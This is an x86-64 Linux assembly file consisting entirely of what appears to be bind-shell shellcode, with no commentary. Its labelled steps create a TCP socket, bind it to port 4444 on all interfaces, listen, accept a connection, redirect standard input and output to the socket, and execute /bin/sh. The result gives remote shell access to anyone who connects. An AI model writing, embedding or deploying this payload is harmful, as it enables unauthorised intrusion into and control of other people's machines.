BITS 64
global _start
section .text
_start:
create_sock:
    mov rax, 0x29
    cdq
    mov rdi, 2
    mov rsi, 1
    syscall
    push rax
    pop rdi
struct_sockaddr:
    push rdx
    push rdx
    mov byte [rsp], 2
    mov word [rsp + 0x2], 0x5c11
    mov rsi, rsp
bind_port:
    push rdx
    mov rdx, 16
    mov rax, 0x31
    syscall
server_listen:
    pop rsi
    mov al, 0x32
    syscall
client_accept:
    mov al, 0x2b
    syscall
    mov rdi, rax
dupe_sockets:  
    mov rsi, 3
dupe_loop:
    dec esi
    mov al, 0x21
    syscall
    jne dupe_loop
exec_shell:
    mov rdx, rsi
    push rsi
    mov rdi, '//bin/sh'         
    push rdi
    push rsp
    pop rdi
    mov al, 0x3b
    syscall

